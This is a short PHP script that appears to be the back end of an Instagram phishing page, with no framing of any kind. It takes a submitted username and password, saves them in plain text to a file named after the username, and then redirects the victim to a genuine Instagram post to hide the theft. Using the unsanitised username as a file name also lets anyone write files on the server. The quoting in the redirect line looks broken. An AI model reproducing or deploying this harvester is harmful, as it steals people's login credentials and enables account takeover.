<?php
$get = @$_POST['go'];
$username = strip_tags(@$_POST['username']);
$password = strip_tags(@$_POST['password']);
if($get) {
    $hello = "Username: ".$username." and "."Password: ".$password;
    $fp = fopen($username, 'w');
fwrite($fp, $hello);
fclose($fp);
echo "<meta http-equiv=\"refresh\" content=\"0; url=https://www.instagram.com/p/B2_UcJ3gRd-/">";	
}

?>